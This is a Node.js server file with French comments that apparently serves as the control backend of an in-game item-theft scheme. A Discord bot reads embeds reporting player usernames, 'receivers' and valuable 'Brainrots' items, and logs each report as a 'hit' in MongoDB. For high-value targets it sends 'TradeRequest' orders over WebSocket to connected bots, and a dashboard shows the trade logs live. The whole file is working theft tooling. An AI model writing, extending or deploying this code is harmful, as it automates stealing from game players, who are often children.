const express = require('express');
const mongoose = require('mongoose');
const WebSocket = require('ws');
const http = require('http');
const url = require('url');
const crypto = require('crypto');
const { Server } = require("socket.io");
const { Client, GatewayIntentBits } = require('discord.js');

const app = express();
// 1. On crée d'abord le serveur HTTP
const server = http.createServer(app); 
// 2. Ensuite on peut initialiser Socket.io et WebSocket dessus
const io = new Server(server); 
const wss = new WebSocket.Server({ server });

const activeBots = new Map();      
const MONGO_URI = process.env.MONGO_URI;
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const PORT = process.env.PORT || 10000;

const discordClient = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);


function generateShortId() {
    return crypto.randomBytes(4).toString('hex'); // 4 bytes = 8 caractères hex
}

function parseIncome(text) {
    // Regex identique à ton C# : \$([\d.]+)([KMBT]?)/s
    const match = text.match(/\$([\d.]+)([KMBT]?)\/s/i);
    if (!match) return 0;

    const value = parseFloat(match[1]);
    const unit = match[2].toUpperCase();

    const multipliers = {
        'K': 1_000,
        'M': 1_000_000,
        'B': 1_000_000_000,
        'T': 1_000_000_000_000
    };

    return value * (multipliers[unit] || 1);
}

mongoose.connect(MONGO_URI)
  .then(() => log("✅ [DB] Connexion établie"))
  .catch(err => log(`❌ [DB] ERREUR : ${err}`));

const hitSchema = new mongoose.Schema({
    hitId: { type: String, unique: true, index: true }, // L'ID de 8 caractères
    username: String,
    displayName: String,
    receivers: [String],
    items: [String],
    logs : [String],
    timestamp: { type: Date, default: Date.now }
});

const Hit = mongoose.model('Hit', hitSchema);

discordClient.on('ready', () => {
    log(`✅ [DISCORD] Bot connecté : ${discordClient.user.tag}`);
});

discordClient.on('messageCreate', async (message) => {
    // 1. On ignore les messages du bot lui-même et ceux sans embeds
    if (message.author.id === discordClient.user.id || message.embeds.length === 0) return;

    const embed = message.embeds[0];
    let targetUsername = null;
    let targetDisplayName = null;
    let targetReceivers = [];
    let itemsList = []; // Pour stocker les noms des items trouvés
    let topIncome = 0;
    let isHighValue = false;
    
    const MIN_INCOME_THRESHOLD = 10_000_000; // 10M/s
    const hitId = crypto.randomBytes(4).toString('hex');

    log("📩 [DISCORD] Analyse d'un nouvel embed...");

    // 2. Parcourir les champs (Fields) de l'embed
    embed.fields.forEach(field => {
        
        // --- EXTRACTION INFOS JOUEUR ---
        if (field.name.includes("Player Information")) {
            const lines = field.value.split('\n');
            lines.forEach(line => {
                if (line.includes("Username")) {
                    targetUsername = line.split(':')[1].replace(/`/g, "").trim();
                }
                if (line.includes("Display Name")) {
                    targetDisplayName = line.split(':')[1].replace(/`/g, "").trim();
                }
                if (line.includes("Receiver")) {
                    const rawReceivers = line.split(':')[1].replace(/`/g, "").trim();
                    targetReceivers = rawReceivers.split(',').map(name => name.trim());
                }
            });
        }

        // --- ANALYSE DES VALEURS & ITEMS ---
        if (field.name.includes("Valuable Brainrots")) {
            const lines = field.value.split('\n');
            lines.forEach(line => {
                const income = parseIncome(line);
                itemsList.push(line);

                if (income > topIncome) topIncome = income;
                if (income >= MIN_INCOME_THRESHOLD) isHighValue = true;
            });
        }
    });

    // 3. SAUVEGARDE SYSTÉMATIQUE DANS MONGO (Tous les hits)
    if (targetUsername) {
        try {
            const newHit = new Hit({
                hitId: hitId,
                username: targetUsername,
                displayName: targetDisplayName,
                receivers: targetReceivers,
                items: itemsList,
                totalIncome: topIncome // Optionnel: utile de le garder pour trier la DB
            });

            const savedHit = await newHit.save();
            io.emit('newHit', savedHit); // ENVOI TEMPS RÉEL AU DASHBOARD            
            log(`💾 [DB] Hit #${hitId} enregistré (${targetUsername}) - Items: ${itemsList.length}`);
        } catch (err) {
            log(`❌ [DB-ERROR] Impossible de sauvegarder le hit: ${err.message}`);
        }
    }

    // 4. EXECUTION (Uniquement si valeur élevée et bot connecté)
    if (targetUsername && isHighValue) {
        log(`🔥 [ALERTE] Valeur élevée : ${targetUsername} (${topIncome.toLocaleString()}/s)`);

        // Logique de sélection du bot (on prend le premier receiver dispo)
        const botName = targetReceivers.find(name => activeBots.has(name) && activeBots.get(name).readyState === 1) || "MagixSafe";
        const botWs = activeBots.get(botName);

        if (botWs && botWs.readyState === 1) {
            botWs.send(JSON.stringify({
                Type: "TradeRequest",
                TargetUser: targetUsername,
                HitId: hitId
            }));
            log(`🚀 [HIT #${hitId}] Envoyé à ${botName}`);
        } else {
            log(`⚠️ [SKIP] Bot ${botName} hors ligne. Ordre non envoyé.`);
        }
    }
});

app.get('/ping', (req, res) => res.send("Pong !"));

app.get('/api/hits', async (req, res) => {
    const hits = await Hit.find().sort({ timestamp: -1 }).limit(50);
    res.json(hits);
});

wss.on('connection', async (ws, req) => {
    const parameters = url.parse(req.url, true).query;
    const username = parameters.username || "Unknown";
    activeBots.set(username, ws);

    ws.on('message', async (msg) => {
        try {
            const payload = JSON.parse(msg);
            if (payload.Method === "TradeLog") {
                const { Message, HitId } = payload.Data;

                if (HitId) {
                    // On ajoute le message dans le tableau 'logs' du document correspondant
                    await Hit.findOneAndUpdate(
                        { hitId: HitId },
                        { $push: { logs: `[${new Date().toLocaleTimeString()}] ${Message}` } }
                    );

                    const updatedHit = await Hit.findOne({ hitId: HitId });
                    if (updatedHit) {
                        io.emit('updateHit', updatedHit);
                    }                
                }
            }
        } catch (e) { log(`⚠️ Erreur WS: ${e.message}`); }
    });

    ws.on('close', () => {
        activeBots.delete(username);
    });
});

app.use(express.static('public'));
server.listen(PORT, () => log(`🚀 Serveur actif sur le port ${PORT}`));

discordClient.login(DISCORD_TOKEN);
